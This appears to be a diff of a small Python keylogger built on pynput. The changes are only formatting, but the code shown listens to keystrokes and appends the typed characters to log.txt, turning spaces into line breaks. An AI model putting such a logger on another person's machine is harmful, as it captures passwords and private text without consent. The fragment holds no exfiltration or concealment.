@@ -1,5 +1,6 @@
 import pynput
 from pynput.keyboard import Key, Listener
+
 count = 0
 keys = []
 
@@ -19,12 +20,11 @@ def pressOwnFunction(key):
 def write_file(keys):
     with open("log.txt", 'a') as f:
         for key in keys:
-            k=str(key).replace("'","")
-            if k.find("Key.space") >0:
+            k = str(key).replace("'", "")
+            if k.find("Key.space") > 0:
                 f.write('\n')
-            elif k.find("Key")==-1:
+            elif k.find("Key") == -1:
                 f.write(k)
-                    
 
 
 def releaseOwnFunction(key):
